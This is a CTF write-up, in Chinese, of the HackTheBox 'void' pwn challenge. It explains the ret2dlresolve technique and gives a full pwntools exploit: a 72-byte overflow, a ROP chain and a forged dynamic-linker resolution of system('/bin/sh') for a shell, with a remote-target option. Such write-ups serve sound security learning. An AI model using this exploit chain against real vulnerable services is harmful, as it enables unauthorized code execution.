---
title: "ret2dlresolve - HTB CTF void Writeup"
description: "notes of ret2dlresolve"
publishDate: "17 Nov 2024"
updatedDate: "25 Aug 2025"
tags: ["CTF", "writeup", "pwn"]
---

# 初見 ret2dlresolve

在 HackTheBox CTF 看到 void 這題 結果完全沒想法

- x86_64
- dynamic link
- no pie
- no canary
- 有給 libc
- 整個程式就只 call 了一個 read
&darr; **file**

```plaintext
void: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, BuildID[sha1]=a5a29f47fbeeeff863522acff838636b57d1c213, for GNU/Linux 3.2.0, not stripped
```

&darr; **checksec**

```plaintext
Arch:       amd64
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
RUNPATH:    b'./glibc/'
Stripped:   No
```

&darr; **info functions**

```plaintext
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401030  read@plt
0x0000000000401040  _start
0x0000000000401070  _dl_relocate_static_pie
0x0000000000401080  deregister_tm_clones
0x00000000004010b0  register_tm_clones
0x00000000004010f0  __do_global_dtors_aux
0x0000000000401120  frame_dummy
0x0000000000401122  vuln
0x0000000000401143  main
0x0000000000401160  __libc_csu_init
0x00000000004011c0  __libc_csu_fini
0x00000000004011c4  _fini
```

&darr; **disassemble main**

```plaintext
pwndbg> disassemble main
Dump of assembler code for function main:
   0x0000000000401143 <+0>:     push   rbp
   0x0000000000401144 <+1>:     mov    rbp,rsp
   0x0000000000401147 <+4>:     sub    rsp,0x10
   0x000000000040114b <+8>:     mov    DWORD PTR [rbp-0x4],edi
   0x000000000040114e <+11>:    mov    QWORD PTR [rbp-0x10],rsi
   0x0000000000401152 <+15>:    call   0x401122 <vuln>
   0x0000000000401157 <+20>:    mov    eax,0x0
   0x000000000040115c <+25>:    leave
   0x000000000040115d <+26>:    ret
End of assembler dump.
```

# 想法

- 有給 libc 那看來八成是要 ret2libc 之類的
- 但只有一個 read 完全沒有輸出 根本不知道怎麼 leak
- 看到 *__libc_csu_init* 但是根本沒有 *syscall* gadget
- 查到一個我完全看不懂的解法

> ret2dlresolve

為什麼說看不懂呢 因為大家的解法都是用 pwntools 寫腳本就完事

```python
offset = 72
dlresolve = Ret2dlresolvePayload(exe, symbol="system", args=["/bin/sh\x00"])

rop = ROP(exe)
rop.raw('A'*offset)
rop.read(0, dlresolve.data_addr) # 觸發 read 再讀一次
rop.ret2dlresolve(dlresolve) # 觸發 dlresolve 解析我們輸入的 system 腳本
raw_rop = rop.chain()

print("============ Dumping ROP =============")
info(rop.dump())
print("======================================")

sl(raw_rop)
sl(dlresolve.payload)
r.interactive()
```

這是我解這題用的部分腳本 就 蠻噁心的  
我甚至從來不知道 pwnlib 有 rop 這東西  
更不知道還可以用 rop.read 直接呼叫  
更更不知道有個東西叫 Ret2dlresolvePayload 直接把東西都幫我寫好了  
第一次感受到 pwntools 的偉大

# Ret2dlresolve

## 原理

我們知道在執行一個動態編譯的程式時
呼叫一個函式 -> plt -> got -> libc
下次呼叫同一個函式時就可以直接在 got 中找

而 linux 中用了下面的函式來動態鏈結到 libc
> _dl_runtime_resolve(link_map_obj, reloc_offset)

而他會調用到的東東都在 **.dynamic section**
所以我們只要有辦法修改 **.dynsym (動態字符串表)** 就可以隨便解析任何函式!!!  
**但是**這東西可想而知，是唯獨的，所以我們有了新的想法  
因為動態鍊結器會從 **.dynamic** 中索引到目標，所以修改這個行得通  
又或者偽造 **link map** 控制程式執行目標函式

## Exploit

```python
from pwn import *
import sys
import time
context.log_level = "debug"
context.terminal = ["wt.exe", "wsl.exe"]
context.arch = "amd64"
exe = context.binary = ELF("./void")
libc = ELF("glibc/libc.so.6")
def one_gadget(filename: str) -> list:
    return [
        int(i) for i in __import__('subprocess').check_output(
            ['one_gadget', '--raw', filename]).decode().split(' ')
    ]
# brva x = b *(pie+x)
# set follow-fork-mode
# p/x $fs_base
# vis_heap_chucks
# set debug-file-directory /usr/src/glibc/glibc-2.35
# directory /usr/src/glibc/glibc-2.35/malloc
# handle SIGALRM ignore

"""
sc = asm(
    shellcraft.i386.linux.open(b'/home/chal/flag') +
    shellcraft.i386.linux.read('eax', 'esp', 50) +
    shellcraft.i386.linux.write('1', 'esp' ,50)
)
"""

if len(sys.argv) == 1:
    r = process("./void")
    if args.GDB:
        gdb.attach(r)
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    print("Usage: python3 {} [GDB | REMOTE_IP PORT]".format(sys.argv[0]))
    sys.exit(1)
s      = lambda data                :r.send(data)
sa     = lambda x, y                :r.sendafter(x, y)
sl     = lambda data                :r.sendline(data)
sla    = lambda x, y                :r.sendlineafter(x, y)
ru     = lambda delims, drop=True   :r.recvuntil(delims, drop)
rl     = lambda                     :r.recvline()
uu32   = lambda data, num           :u32(r.recvuntil(data)[-num:].ljust(4, b'\x00'))
uu64   = lambda data, num           :u64(r.recvuntil(data)[-num:].ljust(8, b'\x00'))
leak   = lambda name, addr          :log.success('{} = {}'.format(name, addr))
l32    = lambda                     :u32(r.recvuntil("\xf7")[-4:].ljust(4, b'\x00'))
l64    = lambda                     :u64(r.recvuntil("\x7f")[-6:].ljust(8, b'\x00'))
raw_input()
"""
0x0000000000023796 : pop rdi ; ret
196152 /bin/sh
system:0x45e50
"""
offset = 72
dlresolve = Ret2dlresolvePayload(exe, symbol="system", args=["/bin/sh\x00"])

rop = ROP(exe)
rop.raw('A'*offset)
rop.read(0, dlresolve.data_addr) # trigger read again
rop.ret2dlresolve(dlresolve) # trigger dlresolve to redirect the address of system

raw_rop = rop.chain()

print("============ Dumping ROP =============")
info(rop.dump())
print("======================================")

sl(raw_rop)
sl(dlresolve.payload)
r.interactive()%                                                                                                                    
```
